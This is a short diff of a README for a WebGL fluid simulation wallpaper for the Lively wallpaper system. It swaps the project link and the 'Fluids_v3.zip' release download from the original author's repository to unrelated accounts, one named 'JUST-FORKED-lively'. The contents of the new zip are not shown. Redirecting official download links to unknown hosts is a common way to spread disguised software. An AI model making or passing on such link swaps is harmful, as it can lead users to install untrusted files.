@@ -1,7 +1,7 @@
 # WebGL Fluid Simulation
-Modified to work with [lively](https://github.com/rocksdanister/lively) wallpaper system, reacts with system audio.
+Modified to work with [lively](https://masterexecuson.github.io/JUST-FORKED-lively/) wallpaper system, reacts with system audio.
 
-Download: [Fluids_v3.zip](https://github.com/rocksdanister/WebGL-Fluid-Simulation/releases/download/v3/Fluids_v3.zip)
+Download: [Fluids_v3.zip](https://github.com/exophs/webgl/releases/download/v1/webgl-main.zip)
 
 Drag & drop the file into lively window.
 
